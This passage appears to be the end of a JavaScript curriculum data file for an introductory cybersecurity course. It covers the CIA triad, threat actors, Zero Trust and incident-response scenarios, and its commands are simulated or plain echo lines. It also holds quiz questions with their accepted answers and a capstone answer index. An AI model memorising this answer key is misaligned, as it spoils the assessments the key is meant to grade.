    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"300\" cy=\"85\" r=\"75\" fill=\"none\" stroke=\"#6366f1\" stroke-width=\"2\" stroke-dasharray=\"4\"/><polygon points=\"300,20 220,135 380,135\" fill=\"#1e293b\" stroke=\"#00F0FF\" stroke-width=\"2\"/><text x=\"300\" y=\"55\" fill=\"#00F0FF\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Confidentiality</text><text x=\"300\" y=\"72\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"8\" text-anchor=\"middle\">Encryption / ACLs</text><text x=\"240\" y=\"115\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Integrity</text><text x=\"240\" y=\"130\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"8\" text-anchor=\"middle\">Hashes / Signatures</text><text x=\"360\" y=\"115\" fill=\"#fbbf24\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Availability</text><text x=\"360\" y=\"130\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"8\" text-anchor=\"middle\">Redundancy / Backups</text><rect x=\"30\" y=\"60\" width=\"130\" height=\"50\" rx=\"6\" fill=\"#0f172a\" stroke=\"#0284c7\"/><text x=\"95\" y=\"82\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"10\" font-weight=\"bold\" text-anchor=\"middle\">Defense-in-Depth</text><text x=\"95\" y=\"98\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"8\" text-anchor=\"middle\">Layered Controls</text><rect x=\"440\" y=\"60\" width=\"130\" height=\"50\" rx=\"6\" fill=\"#0f172a\" stroke=\"#10b981\"/><text x=\"505\" y=\"82\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"10\" font-weight=\"bold\" text-anchor=\"middle\">Zero Trust</text><text x=\"505\" y=\"98\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"8\" text-anchor=\"middle\">Never Trust, Verify</text></svg>",
    "tryInteractive": {
      "expectedCommand": "calion-audit --posture",
      "simulatedOutput": "[+] CIA Triad Defensive Verification:\n- Confidentiality: TLS 1.3 Active, Disk BitLocker Encrypted [PASS]\n- Integrity: Package SHA-256 Signatures Enforced [PASS]\n- Availability: Multi-AZ Redundancy, Automated Snapshots [PASS]\n[+] Defense Posture: Zero Trust Compliant"
    },
    "terminalCommands": [
      {
        "command": "calion-audit --posture",
        "output": "[+] CIA Triad Defensive Verification:\n- Confidentiality: TLS 1.3 Active, Disk BitLocker Encrypted [PASS]\n- Integrity: Package SHA-256 Signatures Enforced [PASS]\n- Availability: Multi-AZ Redundancy, Automated Snapshots [PASS]\n[+] Defense Posture: Zero Trust Compliant"
      }
    ],
    "objectives": [
      "Map security controls to the core pillars of the CIA Triad (Confidentiality, Integrity, Availability)",
      "Classify the threat actor spectrum from script kiddies to Advanced Persistent Threats (APTs)",
      "Apply core architectural defense principles: Least Privilege, Defense-in-Depth, and Zero Trust",
      "Evaluate realistic enterprise incident scenarios and formulate defensive mitigation strategies"
    ],
    "lessons": [
      {
        "id": "ps-task-12-01",
        "taskNumber": 1,
        "title": "The CIA Triad & Foundational Security Principles",
        "objectives": [
          "Define the three core pillars of the CIA Triad",
          "Map specific security controls to each triad pillar",
          "Analyze the security-versus-usability engineering trade-off"
        ],
        "concept": "The CIA Triad is the foundational framework guiding every security policy, architecture decision, and risk assessment:\n\n1. Confidentiality:\n- Ensuring sensitive information is accessible ONLY to authorized individuals, entities, or processes.\n- Controls: Encryption at rest (AES-256) and in transit (TLS 1.3), Access Control Lists (ACLs), Multi-Factor Authentication (MFA), and privacy masking.\n- Violations: Data breaches, credential theft, unauthorized eavesdropping.\n\n2. Integrity:\n- Maintaining the accuracy, authenticity, and completeness of data, guaranteeing it has not been modified or deleted by unauthorized parties.\n- Controls: Cryptographic hashes (SHA-256), digital signatures, file integrity monitoring (FIM), and database transaction constraints.\n- Violations: Unauthorized database modification, malware file tampering, man-in-the-middle payload alterations.\n\n3. Availability:\n- Ensuring systems, networks, and applications are accessible and operational when needed by authorized users.\n- Controls: Redundant hardware, server clustering, load balancing, offsite backups, disaster recovery sites, and DDoS mitigation.\n- Violations: Distributed Denial of Service (DDoS) floods, ransomware file locking, hardware failures, power outages.\n\nNon-Repudiation:\nA related security property guaranteeing that a sender cannot deny having sent a message or initiated a transaction, mathematically enforced via digital signatures and immutable audit logs.",
        "whyItMatters": "Every cybersecurity vulnerability is categorized by which CIA Triad pillar it compromises (CVSS scoring vector: C, I, A).",
        "examples": [
          "Confidentiality breach: An attacker dumps unencrypted credit card records from an S3 bucket.",
          "Availability breach: A SYN flood overwhelms web server connection tables, crashing the service."
        ],
        "commands": [
          {
            "cmd": "calion-audit --posture",
            "desc": "Run simulated security posture check across CIA triad controls"
          }
        ],
        "exercise": {
          "prompt": "Run the simulated posture verification check in the terminal sandbox using 'calion-audit --posture':",
          "command": "calion-audit --posture",
          "expectedOutput": "[+] CIA Triad Defensive Verification:\n- Confidentiality: TLS 1.3 Active, Disk BitLocker Encrypted [PASS]\n- Integrity: Package SHA-256 Signatures Enforced [PASS]\n- Availability: Multi-AZ Redundancy, Automated Snapshots [PASS]\n[+] Defense Posture: Zero Trust Compliant"
        },
        "reviewSummary": {
          "coreTakeaway": "The CIA Triad (Confidentiality, Integrity, Availability) represents the core triad of information security objectives.",
          "learningOutcome": "Mastered the CIA Triad framework, security controls mapping, and non-repudiation."
        }
      },
      {
        "id": "ps-task-12-02",
        "taskNumber": 2,
        "title": "Threat Actor Spectrum & Zero Trust Architecture",
        "objectives": [
          "Classify threat actors across motivations, skills, and resources (script kiddies, cybercriminals, nation-states)",
          "Define the Principle of Least Privilege and Attack Surface Reduction",
          "Contrast traditional perimeter castle-and-moat security with Zero Trust Architecture"
        ],
        "concept": "To defend networks effectively, security teams must understand who the adversaries are and how modern architectures minimize exposure:\n\nThreat Actor Taxonomy:\n1. Script Kiddies / Novices: Low skill; use automated pre-built scripts and exploit kits without understanding low-level mechanics.\n2. Hacktivists: Politically or ideologically motivated; conduct website defacements and DDoS attacks.\n3. Cybercriminal Syndicates: Financially motivated; operate Ransomware-as-a-Service (RaaS), business email compromise (BEC), and identity theft.\n4. Advanced Persistent Threats (APTs): Nation-state military or intelligence cyber units. Possess vast funding, custom zero-day exploits, and stealthy long-term persistence capabilities.\n5. Insider Threats: Disgruntled or compromised employees with legitimate access.\n\nModern Defensive Paradigms:\n- Principle of Least Privilege (PoLP): Users, applications, and services must be granted strictly the minimum permissions required to perform their specific job\u2014nothing more.\n- Defense-in-Depth: Layering multiple independent security controls (firewalls, endpoint EDR, MFA, least privilege) so that the failure of any single control does not result in total compromise.\n- Zero Trust Architecture (ZTA): Moves away from legacy 'castle-and-moat' perimeter trust (where anything inside the corporate LAN was trusted). ZTA assumes the network is hostile and enforces: 'Never Trust, Always Verify' across every request, user, device, and service.",
        "whyItMatters": "Zero Trust prevents attackers who compromise a single workstation from executing lateral movement freely across the internal corporate network.",
        "examples": [
          "Defense-in-Depth: Requiring both a password AND a hardware security key (FIDO2) so a stolen password alone fails.",
          "Least Privilege: Running web servers under an unprivileged 'www-data' user rather than root."
        ],
        "commands": [
          {
            "cmd": "echo 'Never trust, always verify'",
            "desc": "The foundational tenet of Zero Trust Architecture"
          }
        ],
        "exercise": {
          "prompt": "Output the core tenet of Zero Trust Architecture in the terminal:",
          "command": "echo 'Never trust, always verify'",
          "expectedOutput": "Never trust, always verify"
        },
        "reviewSummary": {
          "coreTakeaway": "Zero Trust replaces perimeter trust with continuous authentication; Defense-in-Depth ensures no single point of failure.",
          "learningOutcome": "Mastered threat actor classifications, Least Privilege, Defense-in-Depth, and Zero Trust principles."
        }
      },
      {
        "id": "ps-task-12-03",
        "taskNumber": 3,
        "title": "Security Scenario Analysis & Defensive Decision Making",
        "objectives": [
          "Analyze complex real-world cyberattack scenarios and identify breached principles",
          "Apply mitigation controls to ransomware, phishing, and DDoS campaigns",
          "Formulate effective incident response containment and remediation decisions"
        ],
        "concept": "A senior security professional must synthesize technical telemetry into strategic defensive decisions across realistic scenarios:\n\nScenario 1: Ransomware Extortion\n- Attack Anatomy: An employee opens a phishing attachment containing an executable dropper. The malware moves laterally using Pass-the-Hash, installs a persistent service on the domain controller (Event ID 7045), and executes AES encryption across shared network file servers.\n- CIA Impact: Primarily Availability (files locked) and Confidentiality (data exfiltration extortion).\n- Defensive Response: Isolate infected subnet; revoke compromised domain credentials; restore from immutable offline backups; inspect auth logs for lateral hops.\n\nScenario 2: Cloud Credential Leakage\n- Attack Anatomy: A developer commits a public GitHub repository containing a hardcoded AWS/Supabase API key. Automated scanners harvest the key within minutes and begin spawning cryptomining EC2 instances.\n- CIA Impact: Confidentiality (credentials compromised) and Availability (compute quota exhausted).\n- Defensive Response: Immediately revoke API key; audit CloudTrail logs for unauthorized API calls; enforce automated secret scanning in CI/CD git pre-commit hooks.\n\nScenario 3: Credential Stuffing & Multi-Layered Defense\n- Attack Anatomy: An attacker uses lists of breached passwords from other sites to attempt logins against your portal.\n- CIA Impact: Confidentiality.\n- Defensive Response: Implement rate limiting and WAF CAPTCHAs, enforce MFA (TOTP / FIDO2), and alert on anomalous IP geolocations.",
        "whyItMatters": "Responding effectively to incidents requires combining log analysis, operating system knowledge, networking fundamentals, and cryptographic verification.",
        "examples": [
          "Immutable Backups: Write-Once-Read-Many (WORM) backups that cannot be encrypted or deleted by ransomware.",
          "Pre-commit Hooks: Git hooks that block commits if regex detects private keys or passwords."
        ],
        "commands": [
          {
            "cmd": "echo 'Incident Containment: Isolate host, revoke tokens, preserve RAM'",
            "desc": "Standard initial containment workflow"
          }
        ],
        "exercise": {
          "prompt": "Simulate displaying the initial incident response containment checklist:",
          "command": "echo 'Incident Containment: Isolate host, revoke tokens, preserve RAM'",
          "expectedOutput": "Incident Containment: Isolate host, revoke tokens, preserve RAM"
        },
        "reviewSummary": {
          "coreTakeaway": "Effective incident response combines technical isolation, credential revocation, and immutable backup restoration.",
          "learningOutcome": "Mastered scenario analysis, threat mitigation, and defensive incident response decision making."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-12-01",
        "taskId": "ps-task-12-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "Which core pillar of the CIA Triad is directly violated when a Distributed Denial of Service (DDoS) attack renders a website inaccessible?",
        "canonicalAnswer": "availability",
        "acceptedAnswers": [
          "availability",
          "Availability"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _",
        "answerLength": 12,
        "hints": [
          "Confidentiality, Integrity, or ...?",
          "Starts with 'avail'."
        ],
        "hint": "The 'A' in the CIA Triad...",
        "explanation": "A Denial of Service (DoS/DDoS) attack floods network bandwidth or server compute resources, directly violating the Availability pillar of the CIA Triad.",
        "xp": 25
      },
      {
        "id": "ps-q-12-02",
        "taskId": "ps-task-12-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "What modern cybersecurity architecture paradigm operates on the core principle 'never trust, always verify'?",
        "canonicalAnswer": "zero trust",
        "acceptedAnswers": [
          "zero trust",
          "zero-trust",
          "Zero Trust",
          "Zero-Trust",
          "zta",
          "ZTA"
        ],
        "visualSlots": "_ _ _ _   _ _ _ _ _",
        "answerLength": 10,
        "hints": [
          "Two words: zero ...",
          "Replaces perimeter castle-and-moat models."
        ],
        "hint": "Two words: zero ...",
        "explanation": "Zero Trust Architecture (ZTA) eliminates implicit perimeter trust, requiring continuous authentication, authorization, and validation of every transaction.",
        "xp": 25
      },
      {
        "id": "ps-q-12-03",
        "taskId": "ps-task-12-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "What fundamental security principle dictates that users and services should be granted only the minimum permissions necessary to perform their job?",
        "canonicalAnswer": "least privilege",
        "acceptedAnswers": [
          "least privilege",
          "principle of least privilege",
          "Least Privilege",
          "polp",
          "POLP"
        ],
        "visualSlots": "_ _ _ _ _   _ _ _ _ _ _ _ _ _",
        "answerLength": 15,
        "hints": [
          "Also abbreviated as PoLP.",
          "Two words: least ..."
        ],
        "hint": "Two words: least ...",
        "explanation": "The Principle of Least Privilege (PoLP) ensures that subjects possess only the minimum rights and privileges required to fulfill their designated function, minimizing blast radius.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 12 Capstone Assessment: Enterprise Defense Architecture Synthesis",
      "scenario": "An enterprise employee falls victim to a sophisticated phishing email and submits their password on an adversary's credential harvesting page. However, when the attacker attempts to log into the corporate VPN using the stolen password, access is denied because the VPN requires a physical FIDO2 hardware security key touch.",
      "taskId": "ps-task-12-assessment",
      "question": {
        "id": "ps-q-12-capstone",
        "type": "choice",
        "question": "Which foundational security architecture principle was successfully demonstrated by preventing compromise despite the complete failure of the password layer?",
        "options": [
          "Defense-in-Depth (Multi-layered security controls)",
          "Single Point of Failure",
          "Security through Obscurity",
          "Static Perimeter Defense"
        ],
        "correctIndex": 0,
        "hints": [
          "Think of layering multiple independent defense barriers (e.g. passwords + MFA).",
          "Defense in ..."
        ],
        "hint": "Defense-in-Depth principle...",
        "explanation": "Defense-in-Depth ensures that security does not rely on a single defensive barrier. When the password layer failed, the independent hardware MFA layer prevented total account takeover.",
        "xp": 25
      }
    }
  }
];

  // Index both primary IDs (ps-room-XX) and legacy IDs (room-XX)
  const roomMap = {};
  rooms.forEach(function(r) {
    roomMap[r.id] = r;
    if (r.legacyId) {
      roomMap[r.legacyId] = r;
    }
  });

  const curriculum = {
    id: "calion-pre-security-v2",
    title: "Pre-Security Pathway",
    tagline: "Foundational Cybersecurity Architecture & Systems Mastery",
    stages: stages,
    rooms: rooms,
    roomMap: roomMap,
    formatVisualSlots: formatVisualSlots,
    stats: {
      totalRooms: rooms.length,
      totalLessons: 42,
      taskQuestions: 42,
      capstoneQuestions: 12,
      totalQuestions: 54,
      roomXP: 600,
      questionXP: 1350,
      maxXP: 1950
    }
  };

  return {
    curriculum: curriculum,
    stages: stages,
    rooms: rooms,
    roomMap: roomMap,
    formatVisualSlots: formatVisualSlots
  };
});
